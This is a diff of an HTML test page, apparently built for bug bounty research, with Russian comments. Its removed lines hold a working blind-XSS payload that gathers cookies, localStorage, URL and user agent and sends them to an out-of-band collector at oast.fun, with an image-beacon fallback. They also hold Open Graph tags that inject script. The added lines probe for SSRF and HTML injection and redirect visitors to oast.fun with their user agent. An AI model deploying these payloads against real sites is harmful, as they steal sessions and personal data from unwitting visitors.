@@ -1,36 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <!-- 1. Попытка кражи данных через Open Graph (для превью ссылок) -->
-    <meta property="og:title" content="<script src='https://jcnxiqrzotvqzopexoxwjckv6e2e3nuri.oast.fun'></script>">
-    <meta property="og:description" content="Check this out! <img src=x onerror=fetch('https://jcnxiqrzotvqzopexoxwjckv6e2e3nuri.oast.fun)>">
+    <!-- 1. Проверка на SSRF и получение IP сервера-парсера через картинку -->
+    <meta property="og:image" content="https://oast.fun">
     
-    <title>Bug Bounty Research</title>
+    <!-- 2. Попытка внедрить HTML в заголовок (если сервер плохо фильтрует) -->
+    <meta property="og:title" content="<b>Test</b> <img src='x' onerror='alert(1)'>">
+    
+    <title>Bug Bounty Test</title>
 </head>
 <body>
+    <!-- 3. Этот скрипт сработает ТОЛЬКО если человек сам кликнет по ссылке -->
     <script>
-        // 2. Автоматическая отправка данных при открытии страницы (Blind XSS)
-        const collector = "https://jcnxiqrzotvqzopexoxwjckv6e2e3nuri.oast.fun";
-        
-        const data = {
-            url: window.location.href,
-            referrer: document.referrer,
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            userAgent: navigator.userAgent
-        };
-
-        // Отправка через fetch
-        fetch(collector + "/exfil", {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(data)
-        });
-
-        // 3. Запасной вариант через Image (если fetch заблокирован CSP)
-        new Image().src = collector + "/log?info=" + btoa(JSON.stringify(data));
+        document.location = "https://oast.fun" + btoa(navigator.userAgent);
     </script>
-    
-    <h1>Nothing to see here...</h1>
 </body>
 </html>
